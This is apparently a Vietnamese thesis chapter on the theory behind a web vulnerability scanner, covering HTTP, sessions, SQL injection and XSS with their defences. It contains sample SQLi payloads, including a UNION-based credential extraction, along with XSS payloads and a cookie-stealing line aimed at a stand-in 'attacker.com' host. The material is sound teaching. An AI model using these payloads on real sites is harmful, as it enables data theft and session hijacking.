# CHƯƠNG 2: CƠ SỞ LÝ THUYẾT

Chương này trình bày các kiến thức nền tảng phục vụ cho việc phân tích, thiết kế và triển khai hệ thống quét lỗ hổng web tích hợp trí tuệ nhân tạo. Nội dung bao gồm kiến trúc ứng dụng web, các lỗ hổng bảo mật phổ biến, kỹ thuật crawling, phương pháp phát hiện lỗ hổng tự động và tổng quan về trí tuệ nhân tạo sinh trong lĩnh vực bảo mật.

## 2.1. Kiến trúc ứng dụng web

### 2.1.1. Mô hình Client-Server

Ứng dụng web hoạt động dựa trên mô hình Client-Server, trong đó trình duyệt web đóng vai trò client gửi yêu cầu đến máy chủ web (server) và nhận lại phản hồi để hiển thị cho người dùng. Mô hình này phân tách rõ ràng giữa tầng trình bày ở phía client và tầng xử lý logic cùng dữ liệu ở phía server, tạo nên kiến trúc phân tán cho phép nhiều client đồng thời truy cập vào cùng một server. Sự phân tách này không chỉ mang lại khả năng mở rộng theo chiều ngang mà còn cho phép server tập trung bảo vệ dữ liệu nhạy cảm trong môi trường có kiểm soát, trong khi client có thể đa dạng về nền tảng (trình duyệt desktop, mobile, ứng dụng nhúng) miễn là tuân thủ các giao thức chuẩn.

Quá trình tương tác trong mô hình Client-Server diễn ra theo trình tự xác định, bắt đầu khi người dùng thực hiện thao tác trên trình duyệt như nhập URL vào thanh địa chỉ, nhấn vào liên kết hoặc gửi biểu mẫu. Trình duyệt sau đó tạo một HTTP request chứa đầy đủ thông tin yêu cầu bao gồm phương thức, đường dẫn tài nguyên, các headers mô tả và body dữ liệu nếu có, rồi gửi request này qua mạng đến máy chủ đích. Máy chủ tiếp nhận request, phân tích nội dung yêu cầu, thực thi logic nghiệp vụ tương ứng và truy vấn cơ sở dữ liệu khi cần thiết. Kết quả xử lý được đóng gói thành HTTP response bao gồm mã trạng thái, headers phản hồi và nội dung trả về, sau đó gửi ngược lại cho trình duyệt. Cuối cùng, trình duyệt nhận response, render nội dung HTML, thực thi JavaScript và hiển thị giao diện hoàn chỉnh cho người dùng.

Mô hình Client-Server tạo ra nhiều điểm tương tác giữa hai phía, đồng thời cũng là nơi phát sinh các nguy cơ bảo mật. Dữ liệu do người dùng gửi lên hoàn toàn có thể bị thao túng trước khi đến server thông qua các công cụ proxy hoặc chỉnh sửa request trực tiếp. Nếu server không thực hiện kiểm tra hợp lệ đầy đủ đối với mọi dữ liệu nhận được, các lỗ hổng nghiêm trọng như SQL Injection hoặc Cross-Site Scripting có thể bị khai thác. Nguyên tắc cơ bản trong bảo mật ứng dụng web là không bao giờ tin tưởng dữ liệu từ phía client, bất kể dữ liệu đó đến từ URL parameters, form fields, cookies hay HTTP headers, vì mọi giá trị có nguồn gốc từ phía client đều có thể bị giả mạo bởi kẻ tấn công.

### 2.1.2. Giao thức HTTP/HTTPS

HTTP (HyperText Transfer Protocol) là giao thức tầng ứng dụng được sử dụng để truyền tải dữ liệu giữa client và server trên World Wide Web. Giao thức này hoạt động theo mô hình request-response và có tính chất stateless, nghĩa là mỗi request được xử lý độc lập mà server không tự động lưu giữ thông tin từ các request trước đó. Tính stateless này đơn giản hóa việc triển khai server nhưng đòi hỏi các cơ chế bổ sung như cookie và session để duy trì trạng thái người dùng qua nhiều request liên tiếp.

HTTP định nghĩa nhiều phương thức để mô tả hành động mà client muốn thực hiện đối với tài nguyên trên server. Phương thức GET được sử dụng để yêu cầu lấy tài nguyên với tham số gắn trực tiếp trên URL, thường dùng khi truy cập trang web hoặc tải dữ liệu. Phương thức POST gửi dữ liệu lên server để xử lý với dữ liệu nằm trong body của request, phổ biến trong việc gửi biểu mẫu đăng nhập hoặc tạo bản ghi mới. Phương thức PUT cập nhật toàn bộ tài nguyên, DELETE xóa tài nguyên, còn HEAD tương tự GET nhưng chỉ trả về headers mà không có body. Trong ngữ cảnh kiểm thử bảo mật, GET và POST là hai phương thức cần quan tâm nhất vì chúng là cách chính mà biểu mẫu HTML gửi dữ liệu người dùng lên server và do đó cũng là vector tấn công phổ biến nhất đối với các lỗ hổng injection.

Cấu trúc của một HTTP request bao gồm ba phần chính. Request line chứa phương thức, đường dẫn tài nguyên (URI) và phiên bản HTTP. Tiếp theo là phần headers cung cấp các thông tin bổ sung như Host xác định tên miền đích, User-Agent mô tả trình duyệt, Cookie chứa dữ liệu phiên làm việc và Content-Type xác định định dạng dữ liệu gửi kèm. Cuối cùng là body chứa dữ liệu thực tế, chủ yếu xuất hiện trong POST request. Ví dụ một GET request đến trang SQL Injection của DVWA có dạng:

```
GET /vulnerabilities/sqli/?id=1&Submit=Submit HTTP/1.1
Host: localhost
User-Agent: Mozilla/5.0
Cookie: PHPSESSID=abc123; security=low
Accept: text/html,application/xhtml+xml
```

Tương tự, HTTP response cũng gồm ba phần với cấu trúc tương đồng. Status line chứa phiên bản HTTP và mã trạng thái phản hồi. Headers phản hồi bao gồm Content-Type xác định kiểu nội dung, Content-Length cho biết kích thước body và Set-Cookie thiết lập cookie mới. Body chứa nội dung phản hồi thực tế như HTML, JSON hoặc dữ liệu nhị phân tùy theo yêu cầu của client.

Mã trạng thái HTTP được chia thành năm nhóm theo chữ số đầu tiên, mỗi nhóm phản ánh một trạng thái xử lý khác nhau. Nhóm 1xx mang tính thông tin, cho biết server đã nhận request và đang tiếp tục xử lý. Nhóm 2xx biểu thị thành công, trong đó 200 OK là phổ biến nhất cho thấy request được xử lý hoàn tất. Nhóm 3xx liên quan đến chuyển hướng với các mã thường gặp như 301 Moved Permanently hoặc 302 Found. Nhóm 4xx báo lỗi phía client như 400 Bad Request, 403 Forbidden hoặc 404 Not Found, trong khi nhóm 5xx báo lỗi phía server với 500 Internal Server Error là điển hình. Trong kiểm thử bảo mật, sự thay đổi mã trạng thái giữa request bình thường và request chứa payload tấn công có thể là dấu hiệu cho thấy payload đã tác động đến logic xử lý của server, đặc biệt khi mã chuyển từ 200 OK sang 500 Internal Server Error sau khi gửi payload SQL Injection.

HTTPS (HTTP Secure) là phiên bản bảo mật của HTTP, bổ sung lớp mã hóa TLS/SSL để bảo vệ dữ liệu trong quá trình truyền tải. HTTPS đảm bảo tính bí mật khi dữ liệu không bị đọc trộm trên đường truyền, tính toàn vẹn khi dữ liệu không bị sửa đổi và xác thực khi client có thể xác minh danh tính server thông qua chứng chỉ số. Tuy nhiên cần lưu ý rằng HTTPS chỉ bảo vệ dữ liệu trên đường truyền chứ không ngăn chặn được các lỗ hổng ở tầng ứng dụng. SQL Injection và XSS vẫn có thể bị khai thác trên website sử dụng HTTPS vì các lỗ hổng này xảy ra sau khi dữ liệu đã được giải mã tại server, do đó việc sử dụng HTTPS không thay thế được nhu cầu lập trình an toàn ở tầng ứng dụng.

### 2.1.3. Cách trình duyệt giao tiếp với server

Quá trình giao tiếp giữa trình duyệt và server bắt đầu từ việc phân giải DNS, trong đó trình duyệt chuyển đổi tên miền thành địa chỉ IP thông qua hệ thống phân giải tên miền. Sau khi có địa chỉ IP, trình duyệt thiết lập kết nối TCP đến server qua cổng 80 đối với HTTP hoặc cổng 443 đối với HTTPS. Nếu sử dụng HTTPS, quá trình bắt tay TLS diễn ra để trao đổi khóa mã hóa và thiết lập kênh truyền an toàn trước khi bất kỳ dữ liệu ứng dụng nào được gửi đi. Khi kênh truyền đã sẵn sàng, trình duyệt gửi HTTP request và chờ nhận response từ server, đồng thời server tiến hành xử lý request, thực thi logic nghiệp vụ, truy vấn database nếu cần và trả về response tương ứng. Cuối cùng, trình duyệt phân tích HTML nhận được, tải thêm các tài nguyên liên quan như CSS, JavaScript và hình ảnh thông qua các request bổ sung, rồi render trang web hoàn chỉnh cho người dùng quan sát.

Do HTTP là giao thức stateless, cơ chế Cookie và Session được phát triển để duy trì trạng thái phiên làm việc qua nhiều request liên tiếp. Cookie là đoạn dữ liệu nhỏ được server gửi về trình duyệt thông qua header Set-Cookie trong response, sau đó trình duyệt lưu trữ cookie và tự động gửi kèm trong mọi request tiếp theo đến cùng domain thông qua header Cookie. Session là cơ chế lưu trữ trạng thái phía server, hoạt động bằng cách tạo một session ID duy nhất cho mỗi phiên làm việc và gửi session ID này cho client dưới dạng cookie. Mỗi request tiếp theo client gửi session ID để server nhận diện và khôi phục trạng thái phiên tương ứng. Trong ngữ cảnh kiểm thử bảo mật, hệ thống quét lỗ hổng cần có khả năng duy trì phiên đăng nhập bằng cách gửi kèm các cookie cần thiết trong mọi request, ví dụ cookie PHPSESSID và security khi quét ứng dụng DVWA, vì nhiều trang chức năng quan trọng chỉ có thể truy cập sau khi xác thực thành công.

Biểu mẫu HTML là phương thức chính để người dùng gửi dữ liệu lên server và cũng là vector tấn công quan trọng nhất trong kiểm thử bảo mật web. Một biểu mẫu được định nghĩa bằng thẻ `<form>` với thuộc tính action xác định URL đích nhận dữ liệu và thuộc tính method xác định phương thức gửi. Bên trong biểu mẫu, các thẻ `<input>`, `<textarea>` và `<select>` tạo ra các trường nhập liệu, mỗi trường có thuộc tính name xác định tên tham số sẽ được gửi lên server. Khi người dùng nhấn nút submit, trình duyệt thu thập giá trị từ tất cả các trường, đóng gói thành cặp name=value và gửi lên server theo phương thức đã chỉ định. Mỗi trường input trong biểu mẫu đại diện cho một điểm nhập dữ liệu tiềm năng mà kẻ tấn công có thể lợi dụng nếu server không xử lý dữ liệu đầu vào một cách an toàn, do đó việc phát hiện và kiểm thử biểu mẫu là nhiệm vụ trọng tâm của hệ thống quét lỗ hổng.

## 2.2. Các lỗ hổng bảo mật web

### 2.2.1. SQL Injection (SQLi)

#### Định nghĩa và nguyên nhân

SQL Injection là lỗ hổng bảo mật xảy ra khi ứng dụng web chèn trực tiếp dữ liệu đầu vào từ người dùng vào câu truy vấn SQL mà không thực hiện kiểm tra, lọc hoặc tham số hóa đầy đủ. Lỗ hổng này cho phép kẻ tấn công thay đổi cấu trúc và logic của câu truy vấn ban đầu, từ đó thực hiện các hành động trái phép như truy cập dữ liệu nhạy cảm, sửa đổi hoặc xóa dữ liệu, thậm chí chiếm quyền điều khiển toàn bộ hệ thống cơ sở dữ liệu. Theo báo cáo OWASP Top 10, Injection liên tục nằm trong nhóm các lỗ hổng nguy hiểm nhất đối với ứng dụng web trong nhiều năm liên tiếp, phản ánh thực trạng nhiều ứng dụng vẫn còn áp dụng các kỹ thuật xây dựng truy vấn không an toàn.

Nguyên nhân gốc rễ của SQL Injection nằm ở việc ứng dụng không phân biệt giữa mã lệnh SQL và dữ liệu người dùng. Khi lập trình viên xây dựng câu truy vấn bằng cách nối chuỗi (string concatenation) trực tiếp với dữ liệu đầu vào, ranh giới giữa phần cấu trúc truy vấn và phần dữ liệu bị xóa nhòa, khiến cho dữ liệu đầu vào có thể được hệ quản trị cơ sở dữ liệu hiểu như một phần của câu lệnh SQL thay vì giá trị thuần túy. Kẻ tấn công lợi dụng điều này bằng cách chèn các ký tự đặc biệt của SQL như dấu nháy đơn, dấu chấm phẩy hoặc toán tử logic vào dữ liệu đầu vào để thoát khỏi ngữ cảnh dữ liệu và chèn thêm mã lệnh SQL tùy ý.

Bên cạnh nguyên nhân chính từ việc nối chuỗi, việc thiếu kiểm tra hợp lệ đầu vào cũng góp phần đáng kể tạo điều kiện cho SQL Injection. Khi server không kiểm tra kiểu dữ liệu, không giới hạn độ dài, không lọc ký tự đặc biệt trong dữ liệu nhận được, kẻ tấn công có thể tự do gửi các payload chứa mã SQL độc hại với độ dài và nội dung tùy ý. Một yếu tố quan trọng khác là việc không sử dụng Prepared Statements, cơ chế cho phép tách biệt hoàn toàn giữa cấu trúc truy vấn và dữ liệu, đảm bảo dữ liệu đầu vào luôn được xử lý như dữ liệu thuần túy chứ không phải mã lệnh. Sự kết hợp của các yếu tố này tạo nên điều kiện thuận lợi để lỗ hổng SQL Injection tồn tại và bị khai thác.

Để minh họa cơ chế hoạt động của SQL Injection, xét đoạn mã PHP xử lý truy vấn thông tin người dùng:

```php
$query = "SELECT * FROM users WHERE id = '" . $_GET['id'] . "'";
$result = mysqli_query($conn, $query);
```

Khi người dùng nhập giá trị bình thường như `id=1`, câu truy vấn được tạo ra là `SELECT * FROM users WHERE id = '1'` và hoạt động đúng mục đích trả về một bản ghi duy nhất tương ứng với id được yêu cầu. Tuy nhiên nếu kẻ tấn công nhập `id=' OR '1'='1`, câu truy vấn trở thành `SELECT * FROM users WHERE id = '' OR '1'='1'`, trong đó điều kiện `'1'='1'` luôn đúng khiến mệnh đề WHERE trở nên vô nghĩa và truy vấn trả về toàn bộ bản ghi trong bảng users thay vì chỉ một bản ghi cụ thể. Đây là ví dụ đơn giản nhất về cách SQL Injection phá vỡ logic truy vấn ban đầu, và trong các tình huống phức tạp hơn, kẻ tấn công có thể trích xuất dữ liệu từ các bảng khác, sửa đổi nội dung bảng hoặc thậm chí thực thi các lệnh hệ điều hành thông qua các tính năng nâng cao của hệ quản trị.

#### Phân loại SQL Injection

SQL Injection được phân thành ba nhóm chính dựa trên cách thức kẻ tấn công nhận được kết quả từ hệ thống bị tấn công, mỗi nhóm có đặc điểm và kỹ thuật khai thác riêng biệt.

In-band SQLi, còn được gọi là Classic SQLi, là dạng phổ biến và dễ khai thác nhất. Trong dạng này, kẻ tấn công sử dụng cùng một kênh giao tiếp HTTP để gửi payload và nhận kết quả ngay trong response trả về. In-band SQLi bao gồm hai kỹ thuật con thường gặp. Error-based SQLi cố tình gây ra lỗi cú pháp SQL để server trả về thông báo lỗi chứa thông tin nhạy cảm về cấu trúc cơ sở dữ liệu, bao gồm tên bảng, tên cột hoặc phiên bản hệ quản trị, từ đó cung cấp cho kẻ tấn công thông tin có giá trị để xây dựng các payload tấn công tiếp theo. Union-based SQLi sử dụng toán tử UNION để kết hợp kết quả của truy vấn gốc với một truy vấn tùy ý do kẻ tấn công xây dựng, ví dụ payload `' UNION SELECT username, password FROM users--` cho phép trích xuất thông tin đăng nhập từ bảng users và hiển thị trực tiếp trong nội dung trang web.

Blind SQLi, còn gọi là Inferential SQLi, xuất hiện khi ứng dụng không hiển thị trực tiếp kết quả truy vấn hoặc thông báo lỗi chi tiết trong response. Kẻ tấn công phải suy luận thông tin dựa trên sự khác biệt trong hành vi phản hồi của ứng dụng theo cách gián tiếp. Boolean-based Blind SQLi hoạt động bằng cách gửi các điều kiện logic TRUE hoặc FALSE và quan sát sự khác biệt trong nội dung trang phản hồi, nếu trang hiển thị khác nhau tùy theo điều kiện đúng hay sai thì kẻ tấn công có thể trích xuất dữ liệu từng bit một bằng cách đặt các câu hỏi nhị phân liên tiếp. Time-based Blind SQLi sử dụng các hàm gây trễ thời gian như SLEEP() trong MySQL hoặc WAITFOR DELAY trong SQL Server, ví dụ kẻ tấn công chèn payload `' OR IF(1=1, SLEEP(5), 0)--` và đo thời gian phản hồi để xác định điều kiện đúng hay sai dựa trên việc server có phản hồi chậm hơn bình thường đúng năm giây hay không.

Out-of-band SQLi là dạng đặc biệt sử dụng kênh giao tiếp khác biệt hoàn toàn so với kênh HTTP ban đầu để truyền dữ liệu ra ngoài. Kẻ tấn công có thể kích hoạt server thực hiện DNS lookup hoặc HTTP request đến một server do họ kiểm soát, đính kèm dữ liệu cần trích xuất trong request đó. Dạng này ít phổ biến hơn so với hai dạng trên vì phụ thuộc vào các tính năng đặc biệt của hệ quản trị cơ sở dữ liệu và cấu hình mạng cho phép server database kết nối ra ngoài internet, điều mà các môi trường production thường hạn chế nghiêm ngặt.

#### Cơ chế khai thác

Quy trình khai thác SQL Injection cơ bản bắt đầu từ việc xác định điểm tiêm (injection point), tức là tìm các tham số đầu vào mà ứng dụng sử dụng trong truy vấn SQL. Các điểm tiêm phổ biến bao gồm URL parameters trong GET request, form fields trong POST request, giá trị cookie và thậm chí một số HTTP headers nếu ứng dụng có sử dụng các giá trị này trong truy vấn database. Sau khi xác định điểm tiêm tiềm năng, kẻ tấn công kiểm tra khả năng tiêm bằng cách gửi các ký tự đặc biệt như dấu nháy đơn, dấu nháy kép hoặc dấu chấm phẩy và quan sát phản hồi của ứng dụng. Nếu server trả về thông báo lỗi SQL hoặc hành vi bất thường khác như thay đổi nội dung trang hay mã trạng thái, điểm tiêm được xác nhận tồn tại. Tiếp theo kẻ tấn công xác định loại SQLi cụ thể dựa trên đặc điểm phản hồi, từ đó áp dụng kỹ thuật khai thác phù hợp để trích xuất thông tin từ cơ sở dữ liệu, có thể là toàn bộ bảng dữ liệu nhạy cảm hoặc thậm chí thông tin đăng nhập của người dùng quản trị.

#### Phương pháp phòng chống

Biện pháp hiệu quả nhất để ngăn chặn SQL Injection là sử dụng Parameterized Queries, còn gọi là Prepared Statements. Cơ chế này tách biệt hoàn toàn giữa cấu trúc truy vấn SQL và dữ liệu đầu vào, trong đó truy vấn được biên dịch trước với các placeholder đánh dấu vị trí dữ liệu, sau đó dữ liệu được truyền riêng biệt và luôn được xử lý như giá trị thuần túy chứ không bao giờ được hiểu như mã lệnh SQL. Trong Python với SQLite, cú pháp tham số hóa là `cursor.execute("SELECT * FROM users WHERE id = ?", (user_id,))`, trong đó dấu hỏi đóng vai trò placeholder và biến user_id được truyền như tham số riêng biệt. Trong PHP với PDO, cú pháp tương ứng là `$stmt = $pdo->prepare("SELECT * FROM users WHERE id = :id"); $stmt->execute(['id' => $user_id]);`, sử dụng named placeholder cho mục đích tương tự. Dù cú pháp khác nhau giữa các ngôn ngữ và driver, nguyên tắc cốt lõi đều là tách biệt câu lệnh khỏi dữ liệu để loại bỏ hoàn toàn khả năng dữ liệu được hiểu như lệnh.

Kiểm tra hợp lệ đầu vào (Input Validation) là biện pháp bổ sung quan trọng cần được áp dụng song song với Prepared Statements. Server cần kiểm tra kiểu dữ liệu để đảm bảo tham số số chỉ chứa chữ số, giới hạn độ dài để ngăn chặn payload quá dài có thể gây tràn buffer hoặc lãng phí tài nguyên, và áp dụng whitelist chỉ chấp nhận các giá trị nằm trong danh sách cho phép khi tập giá trị hợp lệ là hữu hạn và xác định trước được. Escaping hay thoát ký tự đặc biệt là phương pháp thay thế các ký tự có ý nghĩa đặc biệt trong SQL bằng phiên bản an toàn, tuy nhiên phương pháp này kém tin cậy hơn Prepared Statements vì phụ thuộc vào tính chính xác của hàm escape đối với từng phương ngữ SQL cụ thể, do đó chỉ nên dùng như biện pháp phòng thủ theo chiều sâu chứ không phải biện pháp chính.

Nguyên tắc đặc quyền tối thiểu (Least Privilege) yêu cầu tài khoản database mà ứng dụng sử dụng chỉ được cấp quyền tối thiểu cần thiết cho hoạt động bình thường, không bao gồm các quyền nguy hiểm không cần thiết. Nếu ứng dụng chỉ cần đọc dữ liệu thì tài khoản không nên có quyền INSERT, UPDATE hay DELETE, và càng không nên có quyền DROP TABLE hoặc các quyền quản trị khác. Nguyên tắc này giới hạn thiệt hại ngay cả khi SQL Injection bị khai thác thành công vì kẻ tấn công không thể thực hiện được các hành động vượt quá quyền hạn của tài khoản ứng dụng. Web Application Firewall (WAF) đóng vai trò là lớp phòng thủ bổ sung có thể phát hiện và chặn các request chứa pattern SQL Injection ở tầng mạng trước khi chúng đến được ứng dụng, tuy nhiên WAF không thay thế được việc lập trình an toàn vì luôn tồn tại các kỹ thuật bypass thông qua encoding hoặc obfuscation tinh vi.

### 2.2.2. Cross-Site Scripting (XSS)

#### Định nghĩa và nguyên nhân

Cross-Site Scripting (XSS) là lỗ hổng bảo mật xảy ra khi ứng dụng web chèn dữ liệu không tin cậy vào nội dung trang web gửi đến trình duyệt người dùng mà không thực hiện mã hóa hoặc lọc đầu ra phù hợp. Khác với SQL Injection tấn công vào phía server, XSS tấn công vào phía client bằng cách chèn mã JavaScript độc hại vào trang web. Mã này được thực thi trong trình duyệt của nạn nhân với toàn quyền truy cập vào ngữ cảnh trang web hiện tại, bao gồm cookie, session token, nội dung DOM và khả năng thực hiện các hành động thay mặt người dùng đối với ứng dụng. Vì JavaScript được thực thi trong cùng origin với ứng dụng hợp pháp, các cơ chế bảo vệ Same-Origin Policy không có tác dụng ngăn chặn các hành động độc hại từ mã đã được chèn vào.

Nguyên nhân cốt lõi của XSS là việc thiếu mã hóa đầu ra (Output Encoding). Khi ứng dụng nhận dữ liệu từ người dùng và hiển thị lại trong trang HTML mà không chuyển đổi các ký tự đặc biệt như `<`, `>`, `"`, `'` và `&` thành HTML entities tương ứng, trình duyệt không thể phân biệt giữa nội dung dữ liệu và mã HTML hoặc JavaScript. Kẻ tấn công lợi dụng điều này bằng cách chèn các thẻ script hoặc event handler vào dữ liệu đầu vào, và khi dữ liệu này được render trong trình duyệt nạn nhân, mã độc sẽ tự động thực thi mà không có bất kỳ cảnh báo nào. Bên cạnh đó, việc tin tưởng dữ liệu từ client cũng là nguyên nhân phổ biến khi nhiều ứng dụng giả định rằng dữ liệu từ URL parameters, form fields hoặc cookies là an toàn và hiển thị trực tiếp mà không qua xử lý. Thực tế mọi dữ liệu có nguồn gốc từ bên ngoài hệ thống đều cần được coi là không tin cậy và phải được mã hóa trước khi chèn vào ngữ cảnh HTML.

Hậu quả của XSS rất đa dạng và nghiêm trọng tùy theo mức độ phức tạp của payload mà kẻ tấn công xây dựng. Kẻ tấn công có thể đánh cắp cookie phiên làm việc để chiếm quyền tài khoản nạn nhân mà không cần biết mật khẩu, đây là dạng tấn công phổ biến nhất và có tác động trực tiếp nhất. Họ có thể chuyển hướng người dùng đến trang web giả mạo (phishing) để thu thập thông tin nhạy cảm thông qua việc thay đổi document.location. Nội dung trang web có thể bị thay đổi để hiển thị thông tin sai lệch gây mất uy tín cho tổ chức, ví dụ thay đổi thông báo, hiển thị quảng cáo độc hại hoặc giả mạo giao diện đăng nhập. Trong các kịch bản phức tạp hơn, XSS có thể được sử dụng để ghi lại phím nhấn (keylogging), chụp ảnh màn hình thông qua các API mới của trình duyệt, hoặc phát tán malware đến người dùng truy cập trang bị nhiễm.

#### Phân loại XSS

Reflected XSS, còn gọi là Non-Persistent XSS, là dạng phổ biến nhất trong thực tế. Trong dạng này, payload XSS được chèn vào request thường qua URL parameter hoặc form field và phản xạ trực tiếp trong response mà không được lưu trữ trên server. Payload chỉ tồn tại trong một chu kỳ request-response duy nhất nên để tấn công thành công kẻ tấn công cần dụ nạn nhân nhấp vào liên kết chứa payload, thường thông qua email phishing hoặc tin nhắn lừa đảo trên mạng xã hội. Ví dụ nếu ứng dụng có trang tìm kiếm hiển thị lại từ khóa tìm kiếm mà không mã hóa, URL `http://example.com/search?q=<script>alert('XSS')</script>` sẽ khiến mã JavaScript được thực thi trong trình duyệt nạn nhân ngay khi họ truy cập liên kết này.

Stored XSS, còn gọi là Persistent XSS, là dạng nguy hiểm hơn đáng kể so với Reflected XSS. Payload XSS được lưu trữ vĩnh viễn trên server thường trong cơ sở dữ liệu, file log hoặc hệ thống bình luận, và mỗi khi bất kỳ người dùng nào truy cập trang chứa dữ liệu đã bị nhiễm thì mã độc sẽ tự động thực thi mà không cần nạn nhân nhấp vào liên kết đặc biệt. Stored XSS nguy hiểm hơn Reflected XSS vì không yêu cầu tương tác đặc biệt từ nạn nhân, ảnh hưởng đến tất cả người dùng truy cập trang bị nhiễm chứ không chỉ những người nhấp vào liên kết cụ thể, và khó phát hiện hơn vì payload nằm lẫn trong dữ liệu hợp lệ trên server. Một payload Stored XSS thành công trong trang phổ biến có thể ảnh hưởng đến hàng nghìn người dùng trước khi được phát hiện và loại bỏ.

DOM-based XSS là dạng đặc biệt trong đó payload được xử lý hoàn toàn ở phía client thông qua JavaScript mà không gửi lên server. Lỗ hổng xảy ra khi mã JavaScript phía client đọc dữ liệu từ nguồn không tin cậy như URL fragment (phần sau dấu thăng), document.referrer hoặc window.name rồi chèn trực tiếp vào DOM thông qua các hàm nguy hiểm như innerHTML, document.write hoặc eval. Vì payload không đi qua server nên các biện pháp bảo mật phía server như WAF hoặc server-side input validation không thể phát hiện dạng tấn công này, tạo ra thách thức đặc biệt cho việc phòng chống. Để phát hiện DOM-based XSS, cần phân tích mã JavaScript phía client và theo dõi luồng dữ liệu từ các source không tin cậy đến các sink nguy hiểm.

#### Cơ chế khai thác

Quy trình khai thác XSS bắt đầu từ việc xác định điểm phản xạ, tức là tìm các vị trí mà dữ liệu đầu vào được hiển thị lại trong trang web. Các điểm phổ biến bao gồm ô tìm kiếm, trường bình luận, trang hiển thị thông tin cá nhân và URL parameters được render trong trang. Bước tiếp theo là kiểm tra khả năng chèn mã bằng cách gửi các ký tự đặc biệt và kiểm tra xem chúng có được mã hóa trong phản hồi hay không, nếu ký tự `<` xuất hiện nguyên vẹn trong HTML source thay vì được chuyển thành `&lt;` thì điểm đó có khả năng bị khai thác. Sau đó kẻ tấn công xây dựng payload phù hợp với ngữ cảnh HTML cụ thể, vì payload cho ngữ cảnh trong thẻ khác với payload cho ngữ cảnh thuộc tính hay khối script, và xác nhận việc thực thi mã trong trình duyệt thông qua các kỹ thuật như alert đơn giản hoặc gửi yêu cầu HTTP đến server kiểm thử.

Các payload XSS phổ biến bao gồm thẻ script cơ bản `<script>alert('XSS')</script>` thường được dùng để kiểm thử nhanh, event handler trên thẻ hình ảnh `<img src=x onerror="alert('XSS')">` thường vượt qua được các bộ lọc đơn giản loại bỏ thẻ script, thẻ SVG với sự kiện onload `<svg onload="alert('XSS')">` khai thác đặc tính của SVG được render như HTML, và các biến thể sử dụng encoding để bypass bộ lọc với các ký tự được mã hóa Unicode hoặc HTML entity. Trong thực tế, payload thực sự nguy hiểm không chỉ hiển thị alert mà thực hiện các hành động có hại như gửi cookie đến server của kẻ tấn công thông qua mã `document.location='http://attacker.com/steal?c='+document.cookie` hoặc tải mã độc bổ sung từ server bên ngoài để mở rộng khả năng tấn công.

#### Phương pháp phòng chống

Output Encoding là biện pháp phòng chống XSS quan trọng nhất và cần được áp dụng nhất quán tại mọi điểm mà dữ liệu không tin cậy được chèn vào trang web. Nguyên tắc cốt lõi là chuyển đổi các ký tự có ý nghĩa đặc biệt trong HTML thành HTML entities trước khi render, cụ thể ký tự `<` được chuyển thành `&lt;`, `>` thành `&gt;`, `"` thành `&quot;`, `'` thành `&#x27;` và `&` thành `&amp;`. Phương pháp encoding cần phù hợp với ngữ cảnh sử dụng cụ thể vì mỗi ngữ cảnh trong HTML có các ký tự đặc biệt khác nhau: HTML Entity Encoding áp dụng cho nội dung trong body HTML, Attribute Encoding cho giá trị thuộc tính, JavaScript Encoding cho dữ liệu trong khối script và URL Encoding cho dữ liệu trong URL. Trong Flask với template engine Jinja2, auto-escaping được bật mặc định và tự động mã hóa mọi biến được render trong template trừ khi lập trình viên chủ động tắt bằng filter `|safe`, đây là cơ chế bảo vệ đáng tin cậy giúp giảm đáng kể nguy cơ XSS trong các ứng dụng Flask.

Content Security Policy (CSP) là cơ chế bảo mật bổ sung cho phép server chỉ định chính sách về nguồn tài nguyên hợp lệ mà trình duyệt được phép tải và thực thi. CSP được thiết lập thông qua HTTP header `Content-Security-Policy` với các directive xác định nguồn cho phép đối với từng loại tài nguyên cụ thể. Ví dụ directive `script-src 'self'` chỉ cho phép thực thi JavaScript từ cùng origin, ngăn chặn hiệu quả việc thực thi inline script và script từ nguồn bên ngoài, đây là một trong những directive quan trọng nhất để giảm thiểu XSS. CSP không ngăn chặn XSS hoàn toàn vì kẻ tấn công vẫn có thể tìm cách bypass thông qua các nguồn được whitelist hoặc các kỹ thuật khác, nhưng giảm thiểu đáng kể tác động bằng cách hạn chế khả năng thực thi mã độc ngay cả khi payload được chèn thành công vào trang.

Thiết lập cookie flags phù hợp cũng góp phần giảm thiểu tác động của XSS đối với phiên người dùng. Flag HttpOnly ngăn JavaScript truy cập cookie thông qua document.cookie, khiến kẻ tấn công không thể đánh cắp session cookie ngay cả khi khai thác XSS thành công, đây là biện pháp đơn giản nhưng hiệu quả cao chống lại dạng tấn công đánh cắp phiên phổ biến nhất. Flag Secure đảm bảo cookie chỉ được gửi qua kết nối HTTPS, ngăn chặn việc cookie bị lộ trên các kết nối HTTP không mã hóa. Flag SameSite hạn chế việc gửi cookie trong các request cross-origin, giảm thiểu rủi ro từ các cuộc tấn công liên quan đến cross-site request. Các framework web hiện đại như Flask với Jinja2, Django và React đều tích hợp cơ chế auto-escaping mặc định, tuy nhiên lập trình viên cần cẩn thận khi sử dụng các hàm bypass như `|safe` trong Jinja2 hoặc `dangerouslySetInnerHTML` trong React vì chúng vô hiệu hóa cơ chế bảo vệ tự động và đưa toàn bộ trách nhiệm sanitize dữ liệu lên vai lập trình viên.

## 2.3. Web Crawling

### 2.3.1. Thuật toán duyệt web: BFS và DFS

Web crawling, hay còn gọi là web spidering, là quá trình tự động duyệt qua các trang web để thu thập thông tin về cấu trúc và nội dung của website. Trong ngữ cảnh quét lỗ hổng bảo mật, crawler đóng vai trò là giai đoạn đầu tiên trong pipeline kiểm thử với nhiệm vụ phát hiện tất cả các trang, liên kết và biểu mẫu trong phạm vi mục tiêu để cung cấp dữ liệu đầu vào cho module phát hiện lỗ hổng. Chất lượng của quá trình crawling ảnh hưởng trực tiếp đến độ bao phủ của quá trình quét vì nếu crawler bỏ sót một biểu mẫu thì lỗ hổng tồn tại trên biểu mẫu đó sẽ không bao giờ được phát hiện, do đó việc thiết kế crawler có khả năng phát hiện đầy đủ các điểm nhập dữ liệu là yêu cầu cốt lõi của một hệ thống quét hiệu quả.

